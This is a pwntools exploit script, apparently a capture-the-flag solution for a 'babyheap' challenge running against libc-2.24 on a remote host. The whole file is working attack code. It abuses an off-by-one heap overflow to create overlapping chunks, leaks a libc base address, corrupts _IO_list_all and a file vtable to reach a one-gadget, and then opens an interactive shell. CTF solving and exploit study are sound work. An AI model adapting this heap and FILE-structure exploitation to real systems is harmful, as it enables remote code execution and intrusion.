#coding:utf-8
from pwn import *
import os

context.arch='amd64'
context.log_level='debug'

#io=process('./babyheap',env={'LD_PRELOAD':'./libc-2.24.so'})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io = remote('202.120.7.204',127)
libc = ELF('./libc-2.24.so')

def memu(x):
    io.recvuntil('Command: ')
    io.sendline(str(x))

def alloc(size):
    #io.sendline('1')
    memu(1)
    io.recvuntil('Size: ')
    io.sendline(str(size))
    io.recvline()

def update(index,size,content):
    memu(2)
    io.recvuntil('Index: ')
    io.sendline(str(index))
    io.recvuntil('Size: ')
    io.sendline(str(size))
    io.recvuntil('Content: ')
    io.send(content)
    io.recvline()

def delete(index):
    memu(3)
    io.recvuntil('Index: ')
    io.sendline(str(index))
    io.recvline()

def view(index):
    memu(4)
    io.recvuntil('Index: ')
    io.sendline(str(index))
    io.recvuntil(': ')

if __name__ == '__main__':
    pause()
    alloc(0x48)#0   0x50
    alloc(0x38)#1   0x40
    alloc(0x38)#2   0x40
    alloc(0x48)#3   0x50
    alloc(0x58)#4   0x40
    pause()
    payload = 'a'*0x38+'\x91'
    update(1,len(payload),payload)
    pause()
    payload1 = 'a'*0x48+'\x61'
    update(0,len(payload1),payload1)
    pause()
    payload2 = 'b'*0x18+p64(0x21)
    update(2,len(payload2),payload2)
    pause()
    delete(1)
    pause()
    alloc(0x58)#1 0x60
    payload3 = 'c'*0x38+'\x91'
    update(1,len(payload3),payload3)
    pause()
    delete(2)#in unsortbin
    print 'debug0'
    pause()
    view(1)
    io.recv(64)
    libc_base = u64(io.recv(8))-0x399b58
    print hex(libc_base)
    pause()
  
    io_list_all = libc_base + libc.symbols['_IO_list_all']
    jump_table_addr = libc_base + libc.symbols['_IO_file_jumps'] + 0xc0

    payload4 = '\x00'*0x38+p64(0x61)+p64(0)+p64(io_list_all-0x10)+p64(0)
    update(1,len(payload4),payload4)
    
    update(3,0x48,'\x00'*0x48)
    payload5 = '\x00'*0x38+p64(jump_table_addr)+p64(libc_base+0x3f35a)
    update(4,len(payload5),payload5)
    pause()
    
    #alloc(0x50)#4   0x40
    alloc(0x20)
    pause()
    io.interactive()  
    
    
